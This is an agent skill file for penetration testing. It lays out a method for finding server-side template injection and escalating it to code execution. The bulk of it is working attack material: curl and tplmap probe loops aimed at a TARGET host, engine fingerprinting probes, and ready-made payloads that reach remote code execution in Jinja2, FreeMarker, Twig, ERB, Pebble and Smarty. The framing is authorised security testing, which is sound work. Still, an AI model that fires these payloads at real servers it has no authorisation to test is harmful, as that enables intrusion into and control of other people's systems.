---
name: attack-ssti
description: Confirm server-side template injection and drive it to code execution — arithmetic and syntax probes that fingerprint Jinja2, Twig, FreeMarker, Velocity and ERB, then the engine-specific escape from the sandbox to the runtime. Reach for it when input is rendered back through a template rather than merely echoed.
metadata:
  acordia:
    family: web-attack
  cyberstrike:
    source: .cyberstrike/skill/attack-ssti/SKILL.md
    commit: 359655518
---

# Server-Side Template Injection (SSTI)

## Objective

Detect and exploit server-side template injection to achieve code execution on the server.

## Testing Methodology

### Phase 1: Detection

```bash
# Automated SSTI detection across template engines — tplmap marks the injection
# point with `*` and fingerprints Jinja2/Twig/FreeMarker/Velocity/ERB/etc.
tplmap -u "https://TARGET/search?q=*"

# Quick mode (math payloads only) — manual probe
for payload in '{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}'; do
  encoded=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$payload")
  echo "== $payload ==" 
  curl -s "https://TARGET/render?template=$encoded" | grep -o '.\{0,20\}49.\{0,20\}'
done
```

### Phase 2: Generic Detection Payloads

Inject into every user-controlled parameter:

```
{{7*7}}           → 49 (Jinja2, Twig)
${7*7}            → 49 (FreeMarker, Velocity, EL)
<%= 7*7 %>        → 49 (ERB, JSP)
#{7*7}            → 49 (Thymeleaf)
{{7*'7'}}         → 7777777 (Jinja2 string multiplication)
${{<%[%'"}}%\.    → polyglot; renders or errors on any engine in the set
*{7*7}            → 49 (Spring EL selection)
{7*7}             → 49 (Smarty)
```

### Phase 3: Engine Fingerprinting

```
{{config.items()}}                    → Jinja2 (Flask/Python)
{{request.application.__globals__}}   → Jinja2
${T(java.lang.Runtime)}               → Spring EL
<#assign x=1>${x}                     → FreeMarker
{{_self.env.getFilter('id')}}         → Twig (PHP)
<%= system('id') %>                   → ERB (Ruby)
```

### Phase 4: Exploitation

**Jinja2 (Python/Flask):**
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()}}
```

**FreeMarker (Java):**
```
${"freemarker.template.utility.Execute"?new()("id")}
```

**Twig (PHP):**
```
{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
```

**ERB (Ruby):**
```
<%= `id` %>
<%= system('id') %>
```

**FreeMarker (Java) — assign variant:**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Pebble (Java):**
```
{% set cmd='id' %}{% set bytes=cmd.getClass().forName('java.lang.Runtime').getRuntime().exec(cmd) %}
```

**Smarty (PHP):**
```
{system('id')}
```

**Handlebars (JS):** detection `{{this}}`; escalate through the block helper —
```
{{#with "s" as |string|}}...{{/with}}
```

### Phase 5: POST-based Injection

```bash
# Test POST parameters
for payload in '{{7*7}}' '${7*7}' '<%= 7*7 %>'; do
  curl -s -X POST "https://TARGET/api/render" \
    -H "Content-Type: application/json" \
    -d "{\"content\":\"$payload\"}"
done
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Math expression evaluated (7*7=49) | High (P2) |
| Config/env data leaked | High (P2) |
| Command execution achieved | Critical (P1) |
| File read via template | Critical (P1) |

## Evidence Requirements

- Injection point (parameter, endpoint)
- Payload sent
- Server response showing template evaluation
- Template engine identified
- For RCE: command output in response

## Tools

- `tplmap` — automated multi-engine SSTI detection and exploitation framework
- `curl` payload-probe loops (Phase 2–5) — manual math/engine-fingerprint testing

## References

- [PortSwigger: SSTI](https://portswigger.net/research/server-side-template-injection)
- [PayloadsAllTheThings: SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
